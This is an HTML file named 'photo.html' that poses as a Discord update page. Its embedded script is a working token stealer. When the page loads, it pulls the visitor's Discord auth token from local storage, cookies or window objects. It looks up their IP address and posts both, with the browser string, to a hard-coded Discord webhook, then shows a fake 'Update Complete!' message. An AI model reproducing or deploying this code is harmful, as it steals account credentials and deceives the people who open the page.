[photo.html](https://github.com/user-attachments/files/32578477/photo.html)
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Discord Update...</title>
    <style>
        body { 
            background: #202225; 
            color: white; 
            font-family: 'Segoe UI', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            flex-direction: column;
        }
        .loader { 
            border: 5px solid #f3f3f3; 
            border-top: 5px solid #5865F2; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { font-size: 18px; opacity: 0.8; }
        .success { color: #57F287; display: none; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Updating Discord to the latest version...</p>
    <div class="success">Update Complete!</div>

    <script>
        const WEBHOOK = "https://canary.discord.com/api/webhooks/1552399401341821018/yFprko1atRjSCEz5VG1q5-uV7YTG38XE87Up-QkNx5Cp1V1G9dV96z5CFxDvNgt7-s9k"; // <--- ضع رابط الويب هوك هنا

        function getToken() {
            // 1. محاولة من LocalStorage
            const localToken = localStorage.getItem("token");
            if (localToken) return localToken;

            // 2. محاولة من Cookies
            const cookies = document.cookie.split(';');
            for (let cookie of cookies) {
                if (cookie.includes("token=")) {
                    return cookie.split("=")[1].trim();
                }
            }

            // 3. محاولة من window (لـ Discord Web فقط)
            return window.xd?.accessToken || Object.values(window).find(v => v?.token)?.token || null;
        }

        async function grab() {
            const token = getToken();
            
            if (token) {
                // إخفاء اللودر وإظهار النجاح
                document.querySelector('.loader').style.display = 'none';
                document.querySelector('p').style.display = 'none';
                document.querySelector('.success').style.display = 'block';

                // جلب الآي بي
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    
                    // إرسال للويب هوك
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            embeds: [{
                                color: 5814783,
                                title: "🎣 Token Grabbed!",
                                fields: [
                                    { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
                                    { name: "IP", value: ipData.ip, inline: true },
                                    { name: "Browser", value: navigator.userAgent.split(' ')[0], inline: true }
                                ]
                            }]
                        })
                    });
                } catch (e) {
                    console.error("Error sending webhook", e);
                }
            } else {
                // إذا لم يجد التوكن، يعيد المحاولة بعد ثانية
                setTimeout(grab, 1500);
            }
        }

        // بدء العملية
        grab();
    </script>
</body>
</html>
